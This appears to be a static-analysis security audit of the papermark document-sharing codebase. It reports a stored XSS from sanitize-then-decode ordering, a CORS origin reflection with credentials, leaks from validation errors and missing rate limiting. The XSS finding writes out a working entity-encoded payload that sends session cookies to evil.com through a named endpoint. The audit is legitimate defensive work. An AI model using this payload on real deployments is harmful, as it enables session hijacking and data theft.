# SAST Pattern Recon — papermark

## Summary

| Pattern | Status | Severity |
|---------|--------|----------|
| XSS (stored) | 🔴 Found | HIGH |
| CORS misconfiguration | 🟡 Found | MEDIUM |
| Information disclosure | 🟡 Found | MEDIUM |
| SQL injection | ✅ Not found | — |
| Command injection | ✅ Not found | — |
| SSRF | ✅ Not found | — |
| XXE | ✅ Not found | — |
| Insecure deserialization | ✅ Not found | — |
| Prototype pollution | ✅ Not found | — |
| Insecure crypto | ✅ Not found | — |

---

### Stored XSS via `sanitizePlainText` entity-decode bypass

- **severity:** HIGH
- **file:** `lib/utils/sanitize-html.ts`
- **line:** 12
- **function:** `sanitizePlainText`
- **pattern:** stored XSS — HTML-entity encoding bypass
- **source:** `POST /api/teams/:teamId/documents/:id/update-name` (request body `name` field) OR `POST /api/teams/:teamId/documents/agreement` (document creation)
- **sink:** `components/documents/document-header.tsx:604` — `dangerouslySetInnerHTML={{ __html: prismaDocument.name }}`
- **taint path:**
  1. Attacker sends `{"name": "&lt;img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)&gt;"}` to update-name endpoint
  2. `update-name.ts:15` calls `sanitizePlainText(value)` via Zod `.transform()`
  3. `sanitizeHtml(content, {allowedTags: []})` strips nothing — there are no literal HTML tags, only entities
  4. `decodeHTML(sanitized)` decodes the entities: `&lt;` → `<`, `&gt;` → `>`, producing a real `<img onerror=...>` tag
  5. Raw HTML stored in PostgreSQL `Document.name` column
  6. When any team member views the document, `document-header.tsx:604` renders via `dangerouslySetInnerHTML`, firing the XSS payload
- **description:**
  The `sanitizePlainText` function calls `sanitizeHtml` first (stripping HTML tags), then `decodeHTML` (decoding entities). This ordering is wrong: encoded entities that survive tag stripping become real HTML tags after decoding. An attacker can bypass sanitization entirely by HTML-encoding the payload. The result is stored XSS that fires on any document view page.
- **evidence:**
  ```typescript
  // lib/utils/sanitize-html.ts:12-19
  export function sanitizePlainText(content: string) {
    const sanitized = sanitizeHtml(content, { allowedTags: [], allowedAttributes: {} });
    const decoded = decodeHTML(sanitized).normalize("NFC"); // <-- decodes AFTER stripping
    return decoded.replace(controlCharsRegex, " ").replace(invisibleControlRegex, "").trim();
  }
  ```
  ```typescript
  // components/documents/document-header.tsx:604
  dangerouslySetInnerHTML={{ __html: prismaDocument.name }} // <-- sink renders unescaped HTML
  ```
  ```typescript
  // pages/api/teams/[teamId]/documents/[id]/update-name.ts:15
  .transform((value) => sanitizePlainText(value)) // <-- input validated with flawed sanitizer
  ```
  ```typescript
  // lib/zod/url-validation.ts:207 (same pattern in documentUploadSchema)
  .transform((value) => sanitizePlainText(value))
  ```

---

### CORS misconfiguration on TUS viewer upload endpoint

- **severity:** MEDIUM
- **file:** `pages/api/file/tus-viewer/[[...file]].ts`
- **line:** 237
- **function:** `setCorsHeaders`
- **pattern:** permissive CORS — arbitrary origin reflection
- **source:** `Origin` request header
- **sink:** `Access-Control-Allow-Origin` response header
- **taint path:** `req.headers.origin` → directly echoed into CORS header without allowlist validation
- **description:**
  The TUS viewer upload endpoint reflects the request `Origin` header verbatim into `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. This allows any website to make authenticated cross-origin requests (including uploads) to this endpoint on behalf of a logged-in user. If the user has an active session, an attacker's page can issue TUS uploads to the victim's dataroom. The endpoint is designed for custom-domain support but the lack of an origin allowlist makes it exploitable from arbitrary attacker origins.
- **evidence:**
  ```typescript
  // pages/api/file/tus-viewer/[[...file]].ts:234-250
  const setCorsHeaders = (req: NextApiRequest, res: NextApiResponse) => {
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*"); // <-- reflects arbitrary origins
    res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS, DELETE, PATCH, HEAD");
    // ...
  };
  ```

---

### Information disclosure via Zod validation error details

- **severity:** MEDIUM
- **file:** multiple API endpoints
- **function:** Zod `.safeParseAsync()` error formatting
- **pattern:** sensitive information leakage in validation error responses
- **source:** invalid/malformed request body
- **sink:** HTTP 400 response body
- **description:**
  Several API endpoints return detailed Zod validation error messages to the client, including the specific validation rules, expected values, and internal field names. In particular, the incoming webhooks endpoint at `pages/api/webhooks/services/[...path]/index.ts:235` returns `validationResult.error.format()` which produces a structured error object with `_errors` arrays and nested field details. This leaks schema structure and validation logic to attackers, facilitating targeted fuzzing and enumeration of API capabilities.
- **evidence:**
  ```typescript
  // pages/api/webhooks/services/[...path]/index.ts:232-238
  const validationResult = RequestBodySchema.safeParse(req.body);
  if (!validationResult.success) {
    return res.status(400).json({
      error: "Invalid request body",
      details: validationResult.error.format(),  // <-- leaks schema structure
    });
  }
  ```
  ```typescript
  // pages/api/teams/[teamId]/documents/agreement.ts:44-48
  return res.status(400).json({
    error: "Invalid agreement document data",
    details: validationResult.error.errors,  // <-- leaks validation details
  });
  ```

---

### No rate limiting on authentication / session endpoints

- **severity:** LOW
- **file:** `pages/api/auth/[...nextauth].ts` (NextAuth configuration)
- **pattern:** missing authentication rate limiting
- **description:**
  The NextAuth.js authentication endpoints do not implement rate limiting on login attempts, email verification requests, or password reset flows. This allows brute-force attacks against user credentials, enumeration of registered email addresses, and mass email-sending attacks against the SMTP relay. The incoming webhooks API at `pages/api/webhooks/services/[...path]/index.ts:181` does implement token-based rate limiting, but the auth endpoints do not.

---

### Webhook event request/response body stored and viewable in admin UI

- **severity:** LOW
- **file:** `pages/api/teams/[teamId]/webhooks/[id]/events.ts`
- **line:** 53
- **function:** event listing handler
- **pattern:** sensitive data in webhook event logs
- **description:**
  Webhook event request and response bodies are decoded from base64-encoded QStash payloads and stored in Tinybird. When viewed in the admin webhook events UI, the raw bodies are rendered. If a webhook destination returns an error page or a third-party service includes sensitive tokens in response bodies, those could be exposed to team members viewing the webhook logs. Additionally, the `webhook-events.tsx` component uses Shiki syntax highlighting which properly escapes HTML, but the stored request/response data in Tinybird is not sanitized before storage.
- **evidence:**
  ```typescript
  // app/api/webhooks/callback/route.ts:43-44
  const request = Buffer.from(sourceBody, "base64").toString("utf-8");
  const response = Buffer.from(body, "base64").toString("utf-8");
  // Stored in Tinybird via recordWebhookEvent()
  ```

---

## Findings not identified

The following patterns were searched for but not found in exploitable form:

| Pattern | Status | Notes |
|---------|--------|-------|
| `eval()` / `Function()` | ✅ Clean | No dynamic code evaluation |
| `innerHTML` (non-React) | ✅ Clean | All DOM manipulation uses React patterns |
| SQL injection via `$queryRaw` | ✅ Clean | All `Prisma.sql` tagged templates properly parameterize inputs; `$executeRawUnsafe` only uses hardcoded savepoint names |
| Command injection | ✅ Clean | `exec`/`spawn` not used; Python script runner (`docx-sanitizer.py`) uses internal temp paths only |
| SSRF | ✅ Clean | `fetchPublicHttpsUrlToBuffer` has robust DNS-rebinding-resistant SSRF protection; `getNotionPageIdFromSlug` scoped to notion.site; incoming webhooks validated via `webhookFileUrlSchema` |
| Path traversal | ✅ Clean | S3 keys use `safeSlugify` + `path.parse` stripping directory components; `validatePathSecurity` blocks `../`, null bytes, double encoding |
| XXE | ✅ Clean | SheetJS `XLSX.read()` is XXE-safe; PDF parsing uses `@libpdf/core`; no XML/SAX parsers with external entities |
| Insecure deserialization | ✅ Clean | All `JSON.parse()` calls operate on server-generated or AWS-signed payloads |
| Prototype pollution | ✅ Clean | No vulnerable deep-merge or unsafe recursive object operations |
| Insecure crypto | ✅ Clean | Passwords hashed with `bcryptjs`; no MD5/SHA1 for security contexts; `Content-MD5` in CORS header is for upload integrity checking |
